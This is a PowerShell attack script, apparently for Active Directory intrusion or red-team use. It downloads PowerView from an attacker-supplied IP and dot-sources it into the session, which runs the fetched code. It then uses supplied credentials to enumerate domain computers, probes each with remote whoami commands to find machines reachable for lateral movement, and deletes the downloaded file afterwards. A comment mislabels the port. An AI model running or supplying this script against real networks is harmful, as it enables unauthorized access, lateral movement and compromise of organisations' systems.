param(
    [Parameter(Mandatory=$true)]
    [string]$AttackerIP,

    [Parameter(Mandatory=$true)]
    [string]$Username,

    [Parameter(Mandatory=$true)]
    [string]$Password
)

Write-Host "[*] PowerShell Version: $($PSVersionTable.PSVersion)"

# Construct URL and temp path
$pvUrl = 'http://' + $AttackerIP + ':445/PowerView.ps1'  # Use default port 80
$pvPath = $pvPath = "$env:TEMP\PowerView.ps1"

# Download PowerView
Write-Host "[*] Downloading PowerView..."
try {
    Invoke-WebRequest -Uri $pvUrl -UseBasicParsing -OutFile $pvPath -ErrorAction Stop
    Write-Host "[+] PowerView saved to $pvPath" -ForegroundColor Green
} catch {
    Write-Error "Download failed: $($_.Exception.Message)"
    exit 1
}

# Import PowerView
Write-Host "[*] Importing PowerView..."
try {
    . $pvPath  # Dot-source to isolate errors
    Write-Host "[+] PowerView imported." -ForegroundColor Green
} catch {
    Write-Error "Import failed: $($_.Exception.Message)"
    exit 1
}

# Rest of your script...
$secPass = ConvertTo-SecureString $Password -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential($Username, $secPass)

Write-Host "[*] Enumerating domain computers..."
try {
    $Computers = Get-NetComputer -Credential $Cred | Select-Object -ExpandProperty Name
    Write-Host "[+] Found $($Computers.Count) computers." -ForegroundColor Green
} catch {
    Write-Error "Enumeration failed: $($_.Exception.Message)"
    exit 1
}
# Array to store accessible machines
$accessibleMachines = @()
foreach ($c in $Computers) {
    Write-Host "[+] Testing $c..." -ForegroundColor Cyan
    try {
        $result = Invoke-Command -ComputerName $c -Credential $Cred -ScriptBlock { whoami } -ErrorAction Stop
        Write-Host "    Access granted. Hostname: $result" -ForegroundColor Green
        # Add to accessible machines list
        $accessibleMachines += [PSCustomObject]@{
            ComputerName = $c
            AccessAs = $result
        }
    } catch {
        Write-Host "    Access denied: $($_.Exception.Message)" -ForegroundColor Red
    }
}
# Display summary
Write-Host "`n=== ACCESSIBLE MACHINES ===" -ForegroundColor Yellow
if ($accessibleMachines.Count -gt 0) {
    $accessibleMachines | Format-Table -AutoSize
    Write-Host "`nTotal accessible machines: $($accessibleMachines.Count)" -ForegroundColor Cyan
} else {
    Write-Host "No machines were accessible via PSRemoting" -ForegroundColor Red
}
# Cleanup
Remove-Item -Path $pvPath -Force
